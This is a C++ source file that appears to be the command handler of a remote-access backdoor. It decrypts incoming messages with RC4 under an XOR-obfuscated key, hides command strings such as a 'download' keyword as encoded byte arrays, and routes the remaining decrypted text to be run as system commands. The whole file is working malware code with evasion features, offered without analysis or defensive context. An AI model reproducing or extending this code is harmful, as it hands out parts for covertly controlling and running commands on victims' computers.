#include "cmder.hpp"

std::string decryptMsg(std::string xmsg)
{
    char cpk[31];

    strncpy(cpk, INET_KEY, sizeof(cpk));
    unxor(cpk);

    std::string key(cpk);

    xRC4 r(key);

    std::string res;
    std::string cmd = r.decrypt(xmsg);
    size_t pos;
    while ((pos = cmd.find('$')) != -1)
    {
        res += cmd.substr(0, pos) + " ";
        cmd.erase(cmd.begin(), cmd.begin() + pos + 1);
    }

    return res;
}

std::string encryptMsg(std::string xmsg)
{
    char cpk[31];

    strncpy(cpk, INET_KEY, sizeof(cpk));
    unxor(cpk);

    std::string key(cpk);
    xRC4 r(key);

    return r.encrypt(xmsg);
}

std::pair<CMDSTATE, RECVDATA> handleCommands(std::string cmd)
{
    std::string xCmd = decryptMsg(cmd);

    std::pair<CMDSTATE, RECVDATA> res;

    // "d0wnl0ad "
    char download[] = "\x64\x31\x75\x6d\x68\x35\x67\x63\x28";
    unxor(download);

    char MACDX[] = "\x4d\x40\x41\x47\x5c";
    unxor(MACDX);

    if (xCmd == download)
    {
        res = std::make_pair(CUSTCMD, "qazwsx");
    }
    else if (xCmd.find(MACDX) != std::string::npos)
    {
        res = std::make_pair(NOTCMD, xCmd);
    }
    else
    {
        res = std::make_pair(SYSCMD, xCmd);
    }

    return res;
}